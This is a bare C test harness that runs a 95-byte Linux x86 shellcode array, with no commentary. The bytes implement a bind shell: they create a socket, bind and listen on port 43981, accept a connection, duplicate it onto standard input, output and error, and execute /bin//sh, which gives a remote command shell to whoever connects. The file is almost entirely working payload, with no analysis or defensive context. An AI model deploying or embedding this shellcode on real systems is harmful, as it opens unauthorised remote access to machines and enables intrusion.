// shellcode length: 95

#include <stdio.h>

// port (0xabcd = 43981)
#define PORT "\xab\xcd"

unsigned char s[] =
"\x31\xdb\xf7\xe3\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd"
"\x80\x96\x6a\x66\x58\x43\x52\x66\x68" PORT "\x66\x53\x89\xe1\x6a"
"\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x52\x56\x89\xe1\xcd"
"\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0"
"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x52\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

void main() {
      printf("shellcode length:   %d\n", sizeof(s)-1);
          ((int(*)())s)();
}
